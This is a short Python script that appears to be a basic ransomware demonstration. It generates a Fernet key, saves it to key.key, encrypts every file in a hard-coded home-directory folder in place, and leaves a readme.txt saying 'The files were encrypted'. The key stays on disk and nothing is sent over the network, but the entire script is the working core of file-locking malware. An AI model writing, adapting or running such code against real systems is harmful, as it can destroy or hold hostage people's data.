from cryptography.fernet import Fernet
import os

def generate_key():
    key = Fernet.generate_key()
    with open('key.key','wb') as key_file:
        key_file.write(key)

def return_key():
    return open('key.key', 'rb').read()

def encrypt(items,key):
    i = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        data = i.encrypt(file_data)
        
        with open(item, 'wb') as file:
            file.write(data)


if __name__ == '__main__':
    path = "/home/darkness/Escritorio/importante"
    items = os.listdir(path)
    files = [path + "/" + x for x in items]

generate_key()
key = return_key()

encrypt(files, key)

with open(path + "/" + "readme.txt",'w') as file:
    file.write("The files were encrypted")